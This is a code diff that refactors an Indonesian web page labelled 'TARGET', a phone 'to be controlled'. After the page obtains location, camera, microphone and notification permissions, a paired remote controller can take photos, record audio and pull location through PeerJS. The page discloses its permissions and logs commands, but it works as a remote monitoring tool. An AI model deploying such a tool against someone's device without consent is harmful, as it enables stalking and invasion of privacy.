@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>TARGET - HP Yang Dikontrol</title>
+  <title>TARGET - Dikontrol</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -23,51 +23,23 @@
       max-width: 500px;
       width: 100%;
       text-align: center;
-      border: 1px solid rgba(255,255,255,0.2);
     }
     h1 { color: white; margin-bottom: 10px; font-size: 1.8rem; }
-    .sub { color: #aaa; margin-bottom: 30px; font-size: 0.9rem; }
-    
     .permission-box {
       background: #0f0f1a;
       border-radius: 32px;
       padding: 20px;
       margin: 15px 0;
     }
-    .permission-list {
-      text-align: left;
-      margin: 15px 0;
-    }
     .permission-item {
       display: flex;
-      align-items: center;
-      gap: 12px;
+      justify-content: space-between;
       padding: 10px 0;
       border-bottom: 1px solid #222;
       color: #ddd;
     }
-    .permission-item .status {
-      margin-left: auto;
-      font-weight: bold;
-    }
-    .status-granted { color: #4caf50; }
-    .status-pending { color: #ff9800; }
-    .status-denied { color: #f44336; }
-    
-    .loading-spinner {
-      width: 40px;
-      height: 40px;
-      border: 3px solid #333;
-      border-top: 3px solid #4fc3f7;
-      border-radius: 50%;
-      margin: 20px auto;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    
+    .granted { color: #4caf50; }
+    .pending { color: #ff9800; }
     .code-box {
       background: #0f0f1a;
       border-radius: 60px;
@@ -75,496 +47,201 @@
       margin: 20px 0;
       display: none;
     }
-    .code {
-      font-size: 1.8rem;
-      font-weight: bold;
-      letter-spacing: 3px;
-      color: #4fc3f7;
-      font-family: monospace;
-      word-break: break-all;
-    }
-    
+    .code { font-size: 1.5rem; font-weight: bold; color: #4fc3f7; font-family: monospace; word-break: break-all; }
     .status {
       background: #0f0f1a;
       border-radius: 40px;
-      padding: 15px;
-      margin: 20px 0;
-      color: #4fc3f7;
-      font-weight: bold;
+      padding: 12px;
+      margin: 15px 0;
       display: none;
     }
-    .connected { color: #4caf50; }
-    
     .btn {
       background: #4fc3f7;
       border: none;
-      padding: 14px 28px;
+      padding: 12px 24px;
       border-radius: 40px;
       font-weight: bold;
-      margin-top: 15px;
       cursor: pointer;
       display: none;
     }
-    
     .log-area {
       background: #0f0f1a;
       border-radius: 24px;
-      padding: 15px;
-      margin-top: 20px;
+      padding: 12px;
+      margin-top: 15px;
       text-align: left;
-      max-height: 200px;
+      max-height: 150px;
       overflow-y: auto;
-      font-size: 0.75rem;
+      font-size: 0.7rem;
       color: #aaa;
       display: none;
     }
-    
-    .section-title {
-      font-size: 0.8rem;
-      color: #4fc3f7;
-      margin-bottom: 10px;
-      text-align: left;
+    .spinner {
+      width: 30px;
+      height: 30px;
+      border: 2px solid #333;
+      border-top: 2px solid #4fc3f7;
+      border-radius: 50%;
+      margin: 10px auto;
+      animation: spin 1s linear infinite;
     }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
 <div class="container">
-  <h1>📱 TARGET DEVICE</h1>
-  <div class="sub">HP yang akan DIKONTROL</div>
-  
-  <!-- Panel Izin -->
-  <div class="permission-box" id="permissionBox">
-    <div class="section-title">🔐 Meminta Izin Akses</div>
-    <div class="permission-list" id="permissionList">
-      <div class="permission-item">
-        📍 Lokasi <span class="status status-pending" id="permLocation">⏳ Menunggu</span>
-      </div>
-      <div class="permission-item">
-        📷 Kamera <span class="status status-pending" id="permCamera">⏳ Menunggu</span>
-      </div>
-      <div class="permission-item">
-        🎙️ Mikrofon <span class="status status-pending" id="permMicrophone">⏳ Menunggu</span>
-      </div>
-      <div class="permission-item">
-        🔔 Notifikasi <span class="status status-pending" id="permNotification">⏳ Menunggu</span>
-      </div>
+  <h1>📱 TARGET</h1>
+  <div class="permission-box" id="permBox">
+    <div id="permList">
+      <div class="permission-item">📍 Lokasi <span id="pLoc" class="pending">⏳</span></div>
+      <div class="permission-item">📷 Kamera <span id="pCam" class="pending">⏳</span></div>
+      <div class="permission-item">🎙️ Mikrofon <span id="pMic" class="pending">⏳</span></div>
+      <div class="permission-item">🔔 Notifikasi <span id="pNotif" class="pending">⏳</span></div>
     </div>
-    <div id="loadingSpinner" class="loading-spinner"></div>
-    <div id="permProgress" style="font-size:0.7rem; color:#888;">Meminta izin 0/4...</div>
+    <div class="spinner" id="spinner"></div>
+    <div id="permText" style="font-size:0.7rem; color:#888;">0/4</div>
   </div>
-  
-  <!-- Panel Kode Pairing (muncul setelah semua izin granted) -->
-  <div class="code-box" id="codeBox">
-    <div style="font-size:0.7rem; color:#888;">KODE PAIRING (bagikan ke controller)</div>
-    <div class="code" id="pairingCode">Loading...</div>
-  </div>
-  
-  <div class="status" id="status">
-    ⏳ Menunggu koneksi...
-  </div>
-  
-  <button class="btn" id="resetBtn">🔄 Generate Kode Baru</button>
-  
-  <div class="log-area" id="logArea">
-    <div>📡 Log aktivitas akan muncul disini</div>
-  </div>
+  <div class="code-box" id="codeBox"><div style="font-size:0.7rem;">KODE PAIRING</div><div class="code" id="pairCode"></div></div>
+  <div class="status" id="status">⏳ Menunggu koneksi...</div>
+  <button class="btn" id="resetBtn">🔄 Kode Baru</button>
+  <div class="log-area" id="logArea"></div>
 </div>
-
 <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
 <script>
-  let peer = null;
-  let connection = null;
-  let currentPeerId = null;
-  let allPermissionsGranted = false;
-  
-  // Status izin (hanya 4)
-  const permissions = {
-    location: false,
-    camera: false,
-    microphone: false,
-    notifications: false
-  };
-  
-  const permElements = {
-    location: document.getElementById('permLocation'),
-    camera: document.getElementById('permCamera'),
-    microphone: document.getElementById('permMicrophone'),
-    notifications: document.getElementById('permNotification')
-  };
-  
-  const pairingCodeDiv = document.getElementById('pairingCode');
-  const statusDiv = document.getElementById('status');
-  const logArea = document.getElementById('logArea');
-  const permissionBox = document.getElementById('permissionBox');
-  const codeBox = document.getElementById('codeBox');
-  const resetBtn = document.getElementById('resetBtn');
-  const loadingSpinner = document.getElementById('loadingSpinner');
-  const permProgress = document.getElementById('permProgress');
-  
-  function addLog(msg, isError = false) {
-    const p = document.createElement('div');
-    p.style.padding = '5px 0';
-    p.style.borderBottom = '1px solid #222';
-    p.style.color = isError ? '#ff8888' : '#88ff88';
-    p.innerHTML = `📌 ${new Date().toLocaleTimeString()} - ${msg}`;
-    logArea.appendChild(p);
-    logArea.scrollTop = logArea.scrollHeight;
-    if (logArea.children.length > 20) {
-      logArea.removeChild(logArea.firstChild);
+  let peer, conn, peerId;
+  let perms = { location: false, camera: false, microphone: false, notifications: false };
+  let mediaRec, audioChunks = [];
+
+  function log(msg, err=false) {
+    const d = document.createElement('div');
+    d.innerHTML = `📌 ${new Date().toLocaleTimeString()} - ${msg}`;
+    d.style.color = err ? '#ff8888' : '#88ff88';
+    d.style.borderBottom = '1px solid #222';
+    d.style.padding = '4px 0';
+    document.getElementById('logArea').appendChild(d);
+    d.scrollIntoView();
+    if (document.getElementById('logArea').children.length > 15) document.getElementById('logArea').removeChild(document.getElementById('logArea').firstChild);
+  }
+
+  function updatePermUI() {
+    let cnt = 0;
+    if (perms.location) { document.getElementById('pLoc').innerHTML = '✅'; document.getElementById('pLoc').className = 'granted'; cnt++; }
+    if (perms.camera) { document.getElementById('pCam').innerHTML = '✅'; document.getElementById('pCam').className = 'granted'; cnt++; }
+    if (perms.microphone) { document.getElementById('pMic').innerHTML = '✅'; document.getElementById('pMic').className = 'granted'; cnt++; }
+    if (perms.notifications) { document.getElementById('pNotif').innerHTML = '✅'; document.getElementById('pNotif').className = 'granted'; cnt++; }
+    document.getElementById('permText').innerHTML = `${cnt}/4`;
+    if (cnt === 4) {
+      document.getElementById('spinner').style.display = 'none';
+      document.getElementById('permBox').style.display = 'none';
+      document.getElementById('codeBox').style.display = 'block';
+      document.getElementById('status').style.display = 'block';
+      document.getElementById('resetBtn').style.display = 'inline-block';
+      document.getElementById('logArea').style.display = 'block';
+      initPeer();
     }
   }
-  
-  function updatePermissionUI() {
-    let grantedCount = 0;
-    for (const [key, value] of Object.entries(permissions)) {
-      if (value) {
-        permElements[key].innerHTML = '✅ Dizinkan';
-        permElements[key].className = 'status status-granted';
-        grantedCount++;
-      } else {
-        permElements[key].innerHTML = '⏳ Menunggu';
-        permElements[key].className = 'status status-pending';
-      }
-    }
-    permProgress.innerHTML = `Meminta izin ${grantedCount}/4...`;
-    
-    // Cek apakah semua izin sudah granted
-    allPermissionsGranted = Object.values(permissions).every(v => v === true);
-    
-    if (allPermissionsGranted) {
-      loadingSpinner.style.display = 'none';
-      permProgress.innerHTML = '✅ Semua izin telah diberikan!';
-      permProgress.style.color = '#4caf50';
-      
-      // Sembunyikan panel izin setelah 1 detik dan tampilkan pairing
-      setTimeout(() => {
-        permissionBox.style.display = 'none';
-        codeBox.style.display = 'block';
-        statusDiv.style.display = 'block';
-        resetBtn.style.display = 'inline-block';
-        logArea.style.display = 'block';
-        initPeer();
-      }, 1000);
-    }
+
+  async function reqLoc() { return new Promise(r => { if(!navigator.geolocation) { perms.location=false; r(false); } else { navigator.geolocation.getCurrentPosition(()=>{ perms.location=true; r(true); }, ()=>{ perms.location=false; r(false); }, {timeout:8000}); } }); }
+  async function reqCam() { try { let s = await navigator.mediaDevices.getUserMedia({video:true}); s.getTracks().forEach(t=>t.stop()); perms.camera=true; return true; } catch(e) { perms.camera=false; return false; } }
+  async function reqMic() { try { let s = await navigator.mediaDevices.getUserMedia({audio:true}); s.getTracks().forEach(t=>t.stop()); perms.microphone=true; return true; } catch(e) { perms.microphone=false; return false; } }
+  async function reqNotif() { if(!('Notification' in window)) { perms.notifications=false; return false; } if(Notification.permission==='granted') { perms.notifications=true; return true; } let r=await Notification.requestPermission(); perms.notifications=(r==='granted'); return perms.notifications; }
+
+  async function requestAll() {
+    log('Meminta izin...');
+    await reqLoc(); updatePermUI(); await new Promise(r=>setTimeout(r,200));
+    await reqCam(); updatePermUI(); await new Promise(r=>setTimeout(r,200));
+    await reqMic(); updatePermUI(); await new Promise(r=>setTimeout(r,200));
+    await reqNotif(); updatePermUI();
+    log(`Selesai: ${Object.values(perms).filter(v=>v).length}/4`);
   }
-  
-  // =============== PERIZINAN (4 IZIN) ===============
-  async function requestLocationPermission() {
-    return new Promise((resolve) => {
-      if (!navigator.geolocation) {
-        permissions.location = false;
-        resolve(false);
-        return;
-      }
-      navigator.geolocation.getCurrentPosition(
-        () => { permissions.location = true; resolve(true); },
-        () => { permissions.location = false; resolve(false); },
-        { enableHighAccuracy: true, timeout: 8000 }
-      );
-    });
-  }
-  
-  async function requestCameraPermission() {
-    try {
-      const tempStream = await navigator.mediaDevices.getUserMedia({ video: true });
-      tempStream.getTracks().forEach(track => track.stop());
-      permissions.camera = true;
-      return true;
-    } catch (e) {
-      permissions.camera = false;
-      return false;
-    }
-  }
-  
-  async function requestMicrophonePermission() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-      stream.getTracks().forEach(t => t.stop());
-      permissions.microphone = true;
-      return true;
-    } catch (e) {
-      permissions.microphone = false;
-      return false;
-    }
-  }
-  
-  async function requestNotificationPermission() {
-    if (!('Notification' in window)) {
-      permissions.notifications = false;
-      return false;
-    }
-    if (Notification.permission === 'granted') {
-      permissions.notifications = true;
-      return true;
-    }
-    const result = await Notification.requestPermission();
-    permissions.notifications = (result === 'granted');
-    return permissions.notifications;
-  }
-  
-  async function requestAllPermissions() {
-    addLog('🔄 Meminta semua izin (Lokasi, Kamera, Mikrofon, Notifikasi)...');
-    
-    await requestLocationPermission();
-    updatePermissionUI();
-    await new Promise(r => setTimeout(r, 300));
-    
-    await requestCameraPermission();
-    updatePermissionUI();
-    await new Promise(r => setTimeout(r, 300));
-    
-    await requestMicrophonePermission();
-    updatePermissionUI();
-    await new Promise(r => setTimeout(r, 300));
-    
-    await requestNotificationPermission();
-    updatePermissionUI();
-    
-    addLog(`✨ Proses izin selesai. ${Object.values(permissions).filter(v=>v===true).length}/4 izin diberikan`);
-  }
-  
-  // =============== PEERJS ===============
+
   function initPeer() {
-    if (peer) peer.destroy();
-    
+    if(peer) peer.destroy();
     peer = new Peer();
-    
-    peer.on('open', (id) => {
-      currentPeerId = id;
-      pairingCodeDiv.innerText = id;
-      addLog(`✅ Peer siap, ID: ${id}`);
-      updateStatus('Menunggu koneksi dari Controller...');
+    peer.on('open', id => { peerId = id; document.getElementById('pairCode').innerText = id; log(`Siap, ID: ${id}`); });
+    peer.on('connection', c => { conn = c; log(`Controller terhubung!`); document.getElementById('status').innerHTML = '✅ Terhubung!'; document.getElementById('status').style.background = '#2e7d32';
+      c.on('data', d => handleCommand(d));
+      c.on('close', () => { log('Controller putus'); document.getElementById('status').innerHTML = '⏳ Menunggu...'; document.getElementById('status').style.background = '#0f0f1a'; conn=null; });
     });
-    
-    peer.on('connection', (conn) => {
-      connection = conn;
-      addLog(`🔗 Controller terhubung! ID: ${conn.peer}`);
-      updateStatus('Terhubung dengan Controller!', true);
-      
-      conn.on('data', (data) => {
-        handleCommand(data);
-      });
-      
-      conn.on('close', () => {
-        addLog(`❌ Controller terputus`);
-        updateStatus('Koneksi putus, menunggu koneksi baru...');
-        connection = null;
-      });
-    });
-    
-    peer.on('error', (err) => {
-      addLog(`⚠️ Error: ${err.type}`, true);
-    });
+    peer.on('error', e => log(`Error: ${e.type}`, true));
   }
-  
-  function updateStatus(text, isConnected = false) {
-    statusDiv.innerHTML = isConnected ? `✅ ${text}` : `⏳ ${text}`;
-    statusDiv.className = isConnected ? 'status connected' : 'status';
+
+  async function handleCommand(cmd) {
+    log(`Perintah: ${cmd.type}`);
+    if(cmd.type === 'location') await getLocation();
+    else if(cmd.type === 'notification') await sendNotif(cmd.message);
+    else if(cmd.type === 'take_photo') await takePhoto(cmd.facingMode || 'environment');
+    else if(cmd.type === 'start_record') await startRecord();
+    else if(cmd.type === 'stop_record') await stopRecord();
   }
-  
-  // =============== EKSEKUSI PERINTAH ===============
-  async function handleCommand(command) {
-    addLog(`📨 Menerima perintah: ${command.type}`);
-    
-    switch(command.type) {
-      case 'location':
-        await getLocationAndSend();
-        break;
-      case 'notification':
-        await sendNotification(command.message);
-        break;
-      case 'take_photo':
-        // TERIMA PARAMETER facingMode dari controller
-        const facingMode = command.facingMode || 'environment';
-        addLog(`📷 Perintah foto dengan kamera: ${facingMode === 'user' ? 'DEPAN' : 'BELAKANG'}`);
-        await takePhotoAndSend(facingMode);
-        break;
-      case 'start_record':
-        await startRecording();
-        break;
-      case 'stop_record':
-        await stopRecordingAndSend();
-        break;
-      default:
-        addLog(`⚠️ Perintah tidak dikenal: ${command.type}`, true);
-    }
-  }
-  
-  async function getLocationAndSend() {
-    addLog(`📍 Mengambil lokasi...`);
-    if (!navigator.geolocation) {
-      sendResponse('location', { error: 'Geolocation tidak didukung' });
-      return;
-    }
-    
+
+  async function getLocation() {
+    if(!perms.location) return sendRes('location', {error:'Izin lokasi ditolak'});
     navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        const data = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
-        addLog(`📍 Lokasi: ${data.lat}, ${data.lng}`);
-        sendResponse('location', data);
-      },
-      (err) => {
-        addLog(`❌ Gagal lokasi: ${err.message}`, true);
-        sendResponse('location', { error: err.message });
-      },
-      { enableHighAccuracy: true, timeout: 10000 }
+      p => sendRes('location', {lat:p.coords.latitude, lng:p.coords.longitude, accuracy:p.coords.accuracy}),
+      e => sendRes('location', {error:e.message})
     );
   }
-  
-  async function sendNotification(message) {
-    addLog(`🔔 Mengirim notifikasi: ${message}`);
-    if ('Notification' in window && Notification.permission === 'granted') {
-      new Notification('📱 Controller', { body: message });
-      sendResponse('notification', { success: true, message });
-    } else {
-      sendResponse('notification', { error: 'Notifikasi tidak diizinkan' });
-    }
+
+  async function sendNotif(msg) {
+    if(perms.notifications) new Notification('Controller', {body:msg});
+    sendRes('notification', {success:perms.notifications, message:msg});
   }
-  
-  // =============== AMBIL FOTO dengan FACING MODE (DIPERBAIKI) ===============
-  async function takePhotoAndSend(facingMode = 'environment') {
-    const modeName = facingMode === 'user' ? 'DEPAN (selfie)' : 'BELAKANG';
-    addLog(`📷 Membuka kamera ${modeName} untuk foto...`);
-    
+
+  async function takePhoto(facing) {
+    const mode = facing === 'user' ? 'DEPAN' : 'BELAKANG';
+    log(`Ambil foto ${mode}...`);
     try {
-      // Coba dengan exact facingMode
-      const constraints = { 
-        video: { facingMode: { exact: facingMode } } 
-      };
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      
-      const video = document.createElement('video');
+      let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facing } } });
+      let video = document.createElement('video');
       video.srcObject = stream;
       await video.play();
-      
-      // Tunggu sebentar agar kamera siap
-      await new Promise(r => setTimeout(r, 500));
-      
-      const canvas = document.createElement('canvas');
+      await new Promise(r=>setTimeout(r,300));
+      let canvas = document.createElement('canvas');
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext('2d');
-      
-      // Untuk kamera depan (user), terapkan mirror effect
-      if (facingMode === 'user') {
-        ctx.translate(canvas.width, 0);
-        ctx.scale(-1, 1);
-      }
-      
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      
-      const imageData = canvas.toDataURL('image/jpeg', 0.8);
-      stream.getTracks().forEach(t => t.stop());
-      
-      addLog(`✅ Foto ${modeName} berhasil diambil (${canvas.width}x${canvas.height})`);
-      sendResponse('photo', { image: imageData, facingMode: facingMode });
-      
-    } catch (err) {
-      addLog(`❌ Gagal ambil foto dengan ${modeName}: ${err.message}`, true);
-      
-      // FALLBACK: coba tanpa exact
-      try {
-        addLog(`🔄 Mencoba fallback tanpa exact...`);
-        const fallbackStream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: facingMode } 
-        });
-        
-        const video = document.createElement('video');
-        video.srcObject = fallbackStream;
-        await video.play();
-        await new Promise(r => setTimeout(r, 500));
-        
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext('2d');
-        
-        if (facingMode === 'user') {
-          ctx.translate(canvas.width, 0);
-          ctx.scale(-1, 1);
-        }
-        
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        const imageData = canvas.toDataURL('image/jpeg', 0.8);
-        fallbackStream.getTracks().forEach(t => t.stop());
-        
-        addLog(`✅ Foto ${modeName} berhasil (fallback)`);
-        sendResponse('photo', { image: imageData, facingMode: facingMode });
-        
-      } catch (e2) {
-        addLog(`❌ Gagal total ambil foto: ${e2.message}`, true);
-        sendResponse('photo', { error: e2.message });
-      }
+      let ctx = canvas.getContext('2d');
+      if(facing === 'user') { ctx.translate(canvas.width,0); ctx.scale(-1,1); }
+      ctx.drawImage(video,0,0,canvas.width,canvas.height);
+      let img = canvas.toDataURL('image/jpeg',0.8);
+      stream.getTracks().forEach(t=>t.stop());
+      sendRes('photo', {image:img, facingMode:facing});
+      log(`Foto ${mode} berhasil`);
+    } catch(e) {
+      log(`Gagal foto: ${e.message}`, true);
+      sendRes('photo', {error:e.message});
     }
   }
-  
-  // =============== REKAM SUARA ===============
-  let mediaRecorder = null;
-  let audioChunks = [];
-  
-  async function startRecording() {
-    addLog(`🎙️ Memulai rekaman suara...`);
+
+  async function startRecord() {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-      mediaRecorder = new MediaRecorder(stream);
+      let stream = await navigator.mediaDevices.getUserMedia({audio:true});
+      mediaRec = new MediaRecorder(stream);
       audioChunks = [];
-      
-      mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
-      mediaRecorder.onstop = () => {
-        const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
-        const reader = new FileReader();
-        reader.onloadend = () => {
-          addLog(`✅ Rekaman selesai, dikirim ke controller`);
-          sendResponse('audio', { audio: reader.result });
-        };
-        reader.readAsDataURL(audioBlob);
-        stream.getTracks().forEach(t => t.stop());
+      mediaRec.ondataavailable = e => audioChunks.push(e.data);
+      mediaRec.onstop = () => {
+        let blob = new Blob(audioChunks, {type:'audio/mpeg'});
+        let reader = new FileReader();
+        reader.onloadend = () => sendRes('audio', {audio:reader.result});
+        reader.readAsDataURL(blob);
+        stream.getTracks().forEach(t=>t.stop());
       };
-      
-      mediaRecorder.start();
-      addLog(`🎙️ Merekam... (akan stop dalam 15 detik atau manual dari controller)`);
-      
-      // Auto stop setelah 15 detik
-      setTimeout(() => {
-        if (mediaRecorder && mediaRecorder.state === 'recording') {
-          addLog(`⏰ Auto-stop setelah 15 detik`);
-          mediaRecorder.stop();
-        }
-      }, 15000);
-      
-      sendResponse('recording_started', { success: true });
-    } catch (err) {
-      addLog(`❌ Gagal rekam: ${err.message}`, true);
-      sendResponse('recording_started', { error: err.message });
-    }
+      mediaRec.start();
+      sendRes('recording_started', {success:true});
+      log('Merekam... (auto stop 15dtk)');
+      setTimeout(()=>{ if(mediaRec && mediaRec.state==='recording') mediaRec.stop(); }, 15000);
+    } catch(e) { sendRes('recording_started', {error:e.message}); log(`Rekam gagal: ${e.message}`, true); }
   }
-  
-  async function stopRecordingAndSend() {
-    if (mediaRecorder && mediaRecorder.state === 'recording') {
-      mediaRecorder.stop();
-      addLog(`⏹️ Menghentikan rekaman dan mengirim hasil`);
-    } else {
-      addLog(`⚠️ Tidak ada rekaman aktif`, true);
-    }
+
+  async function stopRecord() {
+    if(mediaRec && mediaRec.state==='recording') { mediaRec.stop(); log('Rekaman dihentikan'); }
+    else log('Tidak ada rekaman aktif', true);
   }
-  
-  function sendResponse(type, data) {
-    if (connection && connection.open) {
-      connection.send({ response: true, type, data });
-    } else {
-      addLog(`⚠️ Tidak bisa mengirim balasan, koneksi terputus`, true);
-    }
-  }
-  
-  resetBtn.onclick = () => {
-    addLog(`🔄 Generate kode pairing baru...`);
-    if (peer) peer.destroy();
-    initPeer();
-  };
-  
-  // Mulai proses izin
-  requestAllPermissions();
+
+  function sendRes(type, data) { if(conn && conn.open) conn.send({response:true, type, data}); }
+
+  document.getElementById('resetBtn').onclick = () => { if(peer) peer.destroy(); initPeer(); };
+  requestAll();
 </script>
 </body>
 </html>
